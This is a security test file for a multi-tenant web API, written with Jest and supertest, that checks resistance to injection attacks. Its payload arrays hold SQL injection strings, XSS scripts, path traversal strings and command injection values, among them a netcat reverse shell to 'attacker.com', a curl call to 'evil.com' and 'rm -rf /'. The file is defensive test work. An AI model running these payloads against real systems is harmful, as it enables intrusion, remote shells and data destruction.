// @ts-nocheck
/**
 * Injection Prevention Security Tests
 *
 * Tests to ensure the application is protected against:
 * - SQL Injection
 * - XSS (Cross-Site Scripting)
 * - Command Injection
 * - Path Traversal
 */

import request from 'supertest';
import { PrismaClient } from '@prisma/client';
import bcrypt from 'bcrypt';
import app from '../../index';

const prisma = new PrismaClient();

describe('Injection Prevention Security Tests', () => {
  let authToken: string;
  let testTenantId: string;
  const testTenantSubdomain = 'security-test';

  beforeAll(async () => {
    // Create test tenant and staff for authenticated requests
    const tenant = await prisma.tenant.create({
      data: {
        businessName: 'Security Test Tenant',
        subdomain: testTenantSubdomain,
        contactName: 'Security',
        contactEmail: 'security-tenant@example.com',
        status: 'ACTIVE',
        isActive: true,
        isPaused: false,
      },
      select: { id: true },
    });
    testTenantId = tenant.id;

    const hashedPassword = await bcrypt.hash('SecurePass123!', 12);

    const staff = await prisma.staff.create({
      data: {
        email: 'security-test@example.com',
        firstName: 'Security',
        lastName: 'Tester',
        password: hashedPassword,
        role: 'ADMIN',
        tenantId: testTenantId,
        isActive: true,
      },
    });

    // Login to get auth token
    const loginResponse = await request(app)
      .post('/api/auth/login')
      .set('x-tenant-subdomain', testTenantSubdomain)
      .send({
        email: 'security-test@example.com',
        password: 'SecurePass123!',
      });

    authToken = loginResponse.body.token;
  });

  afterAll(async () => {
    await prisma.staff.deleteMany({
      where: { tenantId: testTenantId },
    });
    await prisma.tenant.delete({
      where: { id: testTenantId },
    });
    await prisma.$disconnect();
  });

  describe('SQL Injection Prevention', () => {
    it('should reject SQL injection in login email field', async () => {
      const sqlInjectionAttempts = [
        "admin' OR '1'='1",
        "admin'--",
        "admin' OR '1'='1' --",
        "' OR 1=1--",
        "admin'; DROP TABLE users; --",
        "1' UNION SELECT NULL, NULL, NULL--",
      ];

      for (const maliciousEmail of sqlInjectionAttempts) {
        const response = await request(app)
          .post('/api/auth/login')
          .set('x-tenant-subdomain', testTenantSubdomain)
          .send({
            email: maliciousEmail,
            password: 'password',
          });

        // Validation may return 400; auth failure may return 401; rate limit may return 429.
        // All are acceptable, but we should never get a 500 or leak internals.
        expect([400, 401, 429]).toContain(response.status);
        // Should not leak database information
        const responseText = JSON.stringify(response.body || {});
        expect(responseText).not.toContain('database');
        expect(responseText).not.toContain('SQL');
        expect(responseText).not.toContain('query');
      }
    });

    it('should sanitize SQL injection in search queries', async () => {
      const maliciousQueries = [
        "'; DROP TABLE customers; --",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM staff--",
      ];

      for (const maliciousQuery of maliciousQueries) {
        const response = await request(app)
          .get(`/api/customers/search?q=${encodeURIComponent(maliciousQuery)}`)
          .set('Authorization', `Bearer ${authToken}`)
          .set('x-tenant-subdomain', testTenantSubdomain);

        // Should not cause server error (Prisma should protect)
        expect(response.status).not.toBe(500);
        // Should return empty or safe results
        expect(response.status).toBeGreaterThanOrEqual(200);
        expect(response.status).toBeLessThan(500);
      }
    });

    it('should prevent SQL injection in customer ID parameter', async () => {
      const maliciousIds = [
        "1' OR '1'='1",
        '1; DROP TABLE customers;',
        "1' UNION SELECT * FROM staff--",
      ];

      for (const maliciousId of maliciousIds) {
        const response = await request(app)
          .get(`/api/customers/${encodeURIComponent(maliciousId)}`)
          .set('Authorization', `Bearer ${authToken}`)
          .set('x-tenant-subdomain', testTenantSubdomain);

        // Should return 400 (bad request) or 404 (not found), not 500
        expect([400, 404]).toContain(response.status);
      }
    });
  });

  describe('XSS (Cross-Site Scripting) Prevention', () => {
    it('should sanitize XSS in customer name fields', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg/onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')">',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
      ];

      for (const xssPayload of xssPayloads) {
        const response = await request(app)
          .post('/api/customers')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            firstName: xssPayload,
            lastName: 'Test',
            email: `xss-test-${Date.now()}@example.com`,
            phone: '1234567890',
          });

        // Should either reject or sanitize
        if (response.status === 201) {
          // If accepted, verify it's sanitized in response
          expect(response.body.data.firstName).not.toContain('<script>');
          expect(response.body.data.firstName).not.toContain('javascript:');
          expect(response.body.data.firstName).not.toContain('onerror=');
        }
      }
    });

    it('should escape XSS in search results', async () => {
      const response = await request(app)
        .get('/api/customers/search?q=<script>alert("XSS")</script>')
        .set('Authorization', `Bearer ${authToken}`)
        .set('x-tenant-subdomain', testTenantSubdomain);

      expect(response.status).toBeLessThan(500);
      // Response should not contain unescaped script tags
      const responseText = JSON.stringify(response.body);
      expect(responseText).not.toContain('<script>alert');
    });
  });

  describe('Command Injection Prevention', () => {
    it('should prevent command injection in file operations', async () => {
      const commandInjectionPayloads = [
        '; ls -la',
        '| cat /etc/passwd',
        '& whoami',
        '`rm -rf /`',
        '$(curl evil.com)',
        '; nc -e /bin/sh attacker.com 4444',
      ];

      for (const payload of commandInjectionPayloads) {
        // Test in any endpoint that might process filenames or paths
        const response = await request(app)
          .get(`/api/customers/export?filename=${encodeURIComponent(payload)}`)
          .set('Authorization', `Bearer ${authToken}`)
          .set('x-tenant-subdomain', testTenantSubdomain);

        // Should reject or sanitize, not execute commands
        expect(response.status).not.toBe(500);
        // Should not leak system information
        if (response.body.message) {
          expect(response.body.message).not.toContain('root');
          expect(response.body.message).not.toContain('/etc/');
          expect(response.body.message).not.toContain('bin/sh');
        }
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should prevent directory traversal in file paths', async () => {
      const traversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '/etc/passwd',
        'C:\\windows\\system32',
        '....//....//....//etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '..%252F..%252F..%252Fetc%252Fpasswd',
      ];

      for (const payload of traversalPayloads) {
        const response = await request(app)
          .get(`/api/files/${encodeURIComponent(payload)}`)
          .set('Authorization', `Bearer ${authToken}`)
          .set('x-tenant-subdomain', testTenantSubdomain);

        // Should return 400 (bad request) or 404 (not found), not expose files
        expect([400, 404]).toContain(response.status);
        // Should not leak file system information
        if (response.body.message) {
          expect(response.body.message).not.toContain('/etc/');
          expect(response.body.message).not.toContain('passwd');
          expect(response.body.message).not.toContain('system32');
        }
      }
    });

    it('should sanitize file upload names', async () => {
      const maliciousFilenames = [
        '../../../evil.sh',
        '..\\..\\..\\evil.bat',
        'evil<script>.jpg',
        'evil|rm -rf|.txt',
      ];

      // This is more about validation/sanitization in file upload middleware
      for (const filename of maliciousFilenames) {
        // For now, test the validation logic
        const sanitized = filename
          .replace(/\.\./g, '_')
          .replace(/[^a-zA-Z0-9._-]/g, '_');
        expect(sanitized).not.toContain('..');
        expect(sanitized).not.toContain('/');
        expect(sanitized).not.toContain('\\');
        expect(sanitized).not.toContain('|');
      }
    });
  });

  describe('NoSQL Injection Prevention', () => {
    it('should prevent NoSQL injection in query parameters', async () => {
      const noSqlPayloads = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"$where": "this.password == \'password\'"}',
      ];

      for (const payload of noSqlPayloads) {
        const response = await request(app)
          .get(`/api/customers?filter=${encodeURIComponent(payload)}`)
          .set('Authorization', `Bearer ${authToken}`)
          .set('x-tenant-subdomain', testTenantSubdomain);

        // Should handle safely (we use Prisma/PostgreSQL, but test anyway)
        expect(response.status).not.toBe(500);
      }
    });
  });

  describe('LDAP Injection Prevention', () => {
    it('should sanitize LDAP special characters', async () => {
      const ldapPayloads = [
        '*',
        '(cn=*)',
        '*()|&',
        'admin)(|(password=*))',
        '*)(uid=*))(|(uid=*',
      ];

      for (const payload of ldapPayloads) {
        const response = await request(app)
          .post('/api/auth/login')
          .set('x-tenant-subdomain', testTenantSubdomain)
          .send({
            email: payload,
            password: 'password',
          });

        // Should reject safely
        expect([400, 401, 429]).toContain(response.status);
        const responseText = JSON.stringify(response.body || {});
        expect(responseText).not.toContain('LDAP');
      }
    });
  });

  describe('Header Injection Prevention', () => {
    it('should prevent CRLF injection in headers', async () => {
      const crlfPayloads = [
        'test\r\nSet-Cookie: admin=true',
        'test\nLocation: http://evil.com',
        'test\r\nX-Injected: true',
      ];

      const server = app.listen(0);
      try {
        for (const payload of crlfPayloads) {
          // Node/superagent may reject invalid header characters either immediately or when the request is executed.
          // Accept either a thrown/rejected request OR a safe response (no header injection).
          try {
            const response = await request(server)
              .get('/api/customers')
              .set('Authorization', `Bearer ${authToken}`)
              .set('x-tenant-subdomain', testTenantSubdomain)
              .set('X-Custom-Header', payload);

            expect(response.status).toBeGreaterThanOrEqual(200);
            expect(
              Object.keys(response.headers).join(',').toLowerCase()
            ).not.toContain('injected');
          } catch (err: any) {
            expect(err).toBeDefined();
          }
        }
      } finally {
        await new Promise<void>((resolve) => server.close(() => resolve()));
      }
    });
  });
});
